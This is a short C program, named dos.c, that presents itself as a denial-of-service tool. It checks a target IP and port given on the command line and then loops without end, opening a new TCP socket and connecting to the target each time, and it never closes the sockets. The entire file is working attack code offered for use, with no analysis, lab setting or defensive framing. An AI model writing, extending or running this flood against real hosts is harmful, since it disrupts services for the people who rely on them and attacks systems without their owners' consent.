// gcc dos.c -o dos

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

int is_invalid_ipv4(const char *ip)
{
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ip, &(sa.sin_addr));
    return result == 0;
}

int main(int argc, char *argv[])
{
    if (argc <= 2)
    {
        printf("Use: %s <IP> <port>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    char *endptr;
    long port = strtol(argv[2], &endptr, 10);
    int sockfd;
    struct sockaddr_in target_addr;

    if (is_invalid_ipv4(target_ip))
    {
        printf("invalid IP\n");
        return 1;
    }

    if (port <= 0 || port > 65535)
    {
        printf("port number should be from 1 to 65535\n");
        return 1;
    }

    printf("starting DoS to %s:%li\n", target_ip, port);

    while (1)
    {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        if (sockfd < 0)
        {
            perror("socket");
            return 1;
        }

        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(port);
        target_addr.sin_addr.s_addr = inet_addr(target_ip);

        connect(sockfd, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    return 0;
}
